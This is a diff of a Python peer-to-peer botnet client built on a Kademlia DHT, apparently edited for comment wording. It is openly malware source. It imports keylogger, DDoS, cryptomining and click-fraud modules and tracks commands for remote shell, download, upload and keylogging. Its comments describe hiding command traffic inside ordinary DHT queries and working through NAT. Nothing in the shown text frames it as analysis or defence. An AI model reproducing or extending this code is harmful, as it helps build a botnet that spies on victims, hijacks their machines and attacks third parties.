@@ -12,8 +12,8 @@ import keylogger,ddos, mine, clickFraud
 # If I had time I'd rebuild this into it's own twisted protocol but for a basic client this is all that's needed.
 # The clients (bot and command) need a server to bootstrap off of, but this could be taken away if you wanted to connect
 # to any existing kademlia network. I got a lot of inspiration from the Overlord botnet which uses an existing
-# kademlia network, and blends in with the normal traffic because all of the traffic appears as normal DHT queries.
-# I'm using deferred chains due to the asynchronous aspects of the underlying p2p network.
+# kademlia network, and blends in with normal network traffic because all of the traffic appears as normal DHT queries.
+# I'm using deferred chains due to the asynchronous aspects of the underlying P2P network.
 # Due to the design of the architecture, this should work through NAT as well. 
 
 log.startLogging(sys.stdout)
@@ -33,7 +33,7 @@ class botnode:
 		self.port = port
 		self.id = network_id
 		self.cmdcnt = 0
-		#this will store all the child processes that are started (aka our attack scripts like ddos or keylogging). Might need to do something with them later
+		#this will store all the child processes that are started (aka our attack scripts like ddos or keylogging)
 		self.pgroup = []
 		#don't want to have multiple instances of the same program runnings to I'm using a dict to track them
 		self.cmdsrun = {'DDOS':False,'SHELL':False,'DOWNLOAD':False,'KEYLOG':False,'UPLOAD':False, 'BITCOIN':False, 'CLICKFRAUD':False}
@@ -160,5 +160,5 @@ server.listen(myport)
 server.bootstrap([(bootstrap_ip, port)]).addCallback(bootstrapDone, server)
 reactor.run()
 
-#bootstrap is at 192.168.56.101:8468
+
 
